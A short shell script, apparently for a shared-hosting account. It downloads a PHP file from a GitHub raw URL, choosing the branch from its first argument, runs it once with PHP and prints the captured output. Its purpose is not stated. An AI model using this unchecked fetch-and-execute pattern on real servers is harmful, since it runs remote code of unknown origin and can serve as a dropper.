#!/bin/sh
cd /home/u791571885 && [ -f t171.done ] || { curl -fsSL -o t171.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs171.php" && /opt/alt/php83/usr/bin/php t171.php > t171.done 2>&1; }
head -c 9000 t171.done
